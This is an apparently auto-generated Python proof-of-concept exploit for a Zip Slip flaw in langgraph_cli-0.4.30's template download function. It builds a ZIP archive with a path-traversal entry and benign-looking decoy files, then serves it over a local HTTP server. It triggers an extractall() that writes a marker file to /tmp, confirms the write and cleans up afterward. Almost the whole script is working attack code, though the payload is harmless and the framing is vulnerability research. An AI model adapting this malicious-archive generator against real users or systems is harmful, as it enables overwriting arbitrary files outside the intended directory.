#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: suspicious-003
# Sink: _download_repo_with_requests
# Auto-generated — run with: python3 afo_zip_archive_url_extracts__download_repo_with_requests_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Zip Slip vulnerability in langgraph_cli-0.4.30.

Vulnerability: Arbitrary File Overwrite (AFO) via Zip Slip
CVE: Not assigned (PoC only)
Affected: langgraph_cli-0.4.30

The _download_repo_with_requests() function in templates.py uses
ZipFile.extractall() without validating archive entry names. A malicious
ZIP archive containing path traversal sequences (e.g., '../') can write
files outside the intended extraction directory.

This PoC:
1. Creates a malicious ZIP archive with a path traversal payload
2. Hosts it on a simple HTTP server
3. Demonstrates the vulnerability by writing to /tmp/poc_success.txt

Usage:
    python3 exploit.py [--target-url URL] [--port PORT]

    --target-url: URL where the malicious ZIP will be hosted (default: http://localhost:8888)
    --port: Port for the HTTP server (default: 8888)

Requirements:
    - Python 3.6+
    - No external dependencies beyond standard library
"""

import argparse
import io
import os
import shutil
import sys
import tempfile
import threading
import time
import zipfile
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.request import urlopen
from urllib.error import URLError, HTTPError

# =============================================================================
# Configuration
# =============================================================================

# The payload file that will be written outside the extraction directory
# Using a benign payload for safety - creates a marker file
PAYLOAD_CONTENT = b"Zip Slip PoC - langgraph_cli-0.4.30\n"
PAYLOAD_FILENAME = "poc_success.txt"
TARGET_DIR = "/tmp"  # Directory where we'll write the payload

# The malicious ZIP entry name with path traversal
# This will write to /tmp/poc_success.txt when extracted to any directory
MALICIOUS_ENTRY_NAME = f"../../../../../../..{TARGET_DIR}/{PAYLOAD_FILENAME}"

# =============================================================================
# Malicious ZIP Generator
# =============================================================================

def create_malicious_zip() -> bytes:
    """
    Create a ZIP archive containing a file with path traversal in its name.
    
    The ZIP will contain:
    - A benign file in the root (to simulate a normal template)
    - A malicious file with '../' sequences to escape the extraction directory
    
    Returns:
        bytes: The malicious ZIP archive content
    """
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Add a benign file to make it look like a normal template
        zf.writestr("README.md", b"# Malicious Template\nThis is a PoC.\n")
        
        # Add the malicious entry with path traversal
        # This will write to /tmp/poc_success.txt when extracted
        zf.writestr(MALICIOUS_ENTRY_NAME, PAYLOAD_CONTENT)
        
        # Add another benign file to make the archive look more legitimate
        zf.writestr("src/main.py", b"print('Hello from malicious template')\n")
    
    return zip_buffer.getvalue()


# =============================================================================
# HTTP Server for Hosting Malicious ZIP
# =============================================================================

class MaliciousZipHandler(SimpleHTTPRequestHandler):
    """
    Custom HTTP handler that serves the malicious ZIP archive.
    """
    
    def __init__(self, *args, zip_content: bytes = None, **kwargs):
        self.zip_content = zip_content
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Serve the malicious ZIP archive on any request."""
        self.send_response(200)
        self.send_header('Content-Type', 'application/zip')
        self.send_header('Content-Disposition', 'attachment; filename="template.zip"')
        self.send_header('Content-Length', str(len(self.zip_content)))
        self.end_headers()
        self.wfile.write(self.zip_content)
    
    def log_message(self, format, *args):
        """Suppress default logging for cleaner output."""
        pass


def create_zip_server(zip_content: bytes, port: int = 8888):
    """
    Create and start an HTTP server that serves the malicious ZIP.
    
    Args:
        zip_content: The malicious ZIP archive content
        port: Port to listen on
    
    Returns:
        HTTPServer: The server instance (already started)
    """
    handler = lambda *args, **kwargs: MaliciousZipHandler(
        *args, zip_content=zip_content, **kwargs
    )
    
    server = HTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    return server


# =============================================================================
# Exploit Trigger
# =============================================================================

def trigger_exploit(zip_url: str, extract_path: str):
    """
    Simulate the vulnerable _download_repo_with_requests function.
    
    This replicates the exact vulnerable code path from langgraph_cli.
    
    Args:
        zip_url: URL of the malicious ZIP archive
        extract_path: Directory where the ZIP will be extracted
    
    Returns:
        bool: True if the exploit appears to have succeeded
    """
    print(f"[*] Attempting to download malicious ZIP from: {zip_url}")
    print(f"[*] Extraction target: {extract_path}")
    
    try:
        with urlopen(zip_url, timeout=10) as response:
            if response.status == 200:
                zip_data = response.read()
                print(f"[+] Downloaded {len(zip_data)} bytes")
                
                # This is the vulnerable code path - extractall without validation
                with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
                    print(f"[*] Archive contains {len(zf.namelist())} entries:")
                    for name in zf.namelist():
                        print(f"    - {name}")
                    
                    # VULNERABLE: extractall() will follow path traversal
                    zf.extractall(extract_path)
                    print(f"[+] Files extracted to {extract_path}")
                
                return True
            else:
                print(f"[-] HTTP {response.status}: Failed to download ZIP")
                return False
                
    except HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        return False
    except URLError as e:
        print(f"[-] URL Error: {e.reason}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


# =============================================================================
# Verification
# =============================================================================

def verify_exploit():
    """
    Check if the payload file was written to the target location.
    
    Returns:
        bool: True if the payload file exists
    """
    payload_path = os.path.join(TARGET_DIR, PAYLOAD_FILENAME)
    
    if os.path.exists(payload_path):
        print(f"\n[+] EXPLOIT SUCCEEDED!")
        print(f"[+] Payload written to: {payload_path}")
        with open(payload_path, 'r') as f:
            print(f"[+] Content: {f.read().strip()}")
        return True
    else:
        print(f"\n[-] Payload not found at: {payload_path}")
        return False


# =============================================================================
# Cleanup
# =============================================================================

def cleanup(extract_path: str, payload_path: str):
    """
    Remove any files created during the exploit demonstration.
    
    Args:
        extract_path: Temporary extraction directory
        payload_path: Path to the payload file
    """
    print("\n[*] Cleaning up...")
    
    # Remove the extraction directory
    if os.path.exists(extract_path):
        shutil.rmtree(extract_path, ignore_errors=True)
        print(f"[*] Removed extraction directory: {extract_path}")
    
    # Remove the payload file
    if os.path.exists(payload_path):
        os.remove(payload_path)
        print(f"[*] Removed payload file: {payload_path}")


# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Zip Slip PoC for langgraph_cli-0.4.30",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
    python3 exploit.py --port 9999
        """
    )
    parser.add_argument(
        '--target-url',
        default='http://localhost:8888',
        help='URL where the malicious ZIP will be hosted (default: http://localhost:8888)'
    )
    parser.add_argument(
        '--port',
        type=int,
        default=8888,
        help='Port for the HTTP server (default: 8888)'
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Zip Slip PoC - langgraph_cli-0.4.30")
    print("=" * 60)
    print()
    
    # Step 1: Create the malicious ZIP archive
    print("[*] Creating malicious ZIP archive...")
    zip_content = create_malicious_zip()
    print(f"[+] Created ZIP archive ({len(zip_content)} bytes)")
    print(f"[+] Malicious entry: {MALICIOUS_ENTRY_NAME}")
    print(f"[+] Target file: {TARGET_DIR}/{PAYLOAD_FILENAME}")
    print()
    
    # Step 2: Start the HTTP server to host the malicious ZIP
    print(f"[*] Starting HTTP server on port {args.port}...")
    server = create_zip_server(zip_content, args.port)
    print(f"[+] Server started at http://localhost:{args.port}")
    print()
    
    # Step 3: Create a temporary directory for extraction
    extract_path = tempfile.mkdtemp(prefix="langgraph_poc_")
    print(f"[*] Created temporary extraction directory: {extract_path}")
    print()
    
    try:
        # Step 4: Trigger the exploit
        print("[*] Triggering exploit...")
        print("-" * 40)
        success = trigger_exploit(args.target_url, extract_path)
        print("-" * 40)
        print()
        
        if success:
            # Step 5: Verify the exploit
            print("[*] Checking for payload file...")
            exploit_success = verify_exploit()
            print()
            
            if exploit_success:
                print("[!] VULNERABILITY CONFIRMED: Zip Slip in langgraph_cli-0.4.30")
                print("[!] The extractall() function wrote files outside the target directory")
                print("[!] This allows arbitrary file overwrite (AFO)")
            else:
                print("[?] Exploit may not have worked as expected")
                print("[?] Check if the target path is writable")
        else:
            print("[-] Failed to trigger the exploit")
            print("[?] Check network connectivity and server status")
    
    finally:
        # Step 6: Cleanup
        payload_path = os.path.join(TARGET_DIR, PAYLOAD_FILENAME)
        cleanup(extract_path, payload_path)
        
        # Stop the HTTP server
        server.shutdown()
        print("[*] HTTP server stopped")
    
    print()
    print("[*] PoC completed")


if __name__ == "__main__":
    main()
